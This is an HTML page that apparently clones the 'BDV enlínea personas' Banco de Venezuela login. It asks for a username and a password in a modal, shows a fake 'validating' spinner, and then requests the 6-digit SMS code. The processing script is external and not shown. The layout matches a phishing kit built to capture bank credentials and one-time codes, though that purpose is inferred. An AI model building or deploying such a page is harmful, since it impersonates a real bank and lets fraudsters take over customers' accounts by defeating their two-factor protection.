<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDV enlínea personas</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>

    <div class="wrapper" id="mainWrapper">
        <div class="login-container">
            <div class="logo-container">
                <img src="logo.png" alt="BDV enlínea personas" class="logo">
            </div>

            <form class="login-form" id="loginForm" onsubmit="event.preventDefault();">
                <div class="input-group">
                    <input type="text" id="username" required placeholder=" ">
                    <label for="username">Usuario *</label>
                </div>
                <button type="button" class="btn-submit" id="btnEntrar" disabled>Entrar</button>
            </form>

            <div class="form-links">
                <a href="#" class="link-help">¿Olvidaste tu usuario o clave?</a>
                <p class="register-text">Si eres nuevo clienteBDV</p>
                <a href="#" class="link-register">regístrate aquí</a>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="passwordModal">
        <div class="modal-box">
            
            <div id="modalContent">
                <h2>Introduce tu contraseña</h2>
                <div class="input-group password-group error-state">
                    <input type="password" id="password" required placeholder=" ">
                    <label for="password">Contraseña</label>
                    <span class="toggle-password" id="togglePassword">
                        <i class="far fa-eye"></i>
                    </span>
                </div>
                <p class="error-text" id="passwordErrorText">Contraseña es <span class="bold-error">requerida</span></p>

                <div class="modal-actions">
                    <button type="button" class="btn-modal btn-continue" id="btnContinuar" disabled>Continuar</button>
                    <button type="button" class="btn-modal btn-cancel" id="btnCancelar">Cancelar</button>
                </div>
            </div>

            <div id="modalLoading" class="loading-container-box" style="display: none;">
                <div class="spinner"></div>
                <p class="loading-message">Validando información...</p>
            </div>

            <div id="modalCode" style="display: none;">
                <h2>Verificación de Seguridad</h2>
                <p class="code-instruction-text">Introduce el código de 6 dígitos enviado a tu dispositivo</p>
                
                <div class="input-group code-group">
                    <input type="text" id="smsCode" maxlength="6" inputmode="numeric" pattern="[0-9]*" required placeholder=" ">
                    <label for="smsCode">Código de verificación *</label>
                </div>
                <p class="error-text-code" id="codeErrorText" style="display: none;">Código inválido o expirado</p>

                <div class="modal-actions">
                    <button type="button" class="btn-modal btn-continue" id="btnEnviarCodigo" disabled>Enviar</button>
                    <button type="button" class="btn-modal btn-cancel" id="btnCancelarCodigo">Cancelar</button>
                </div>
            </div>

        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
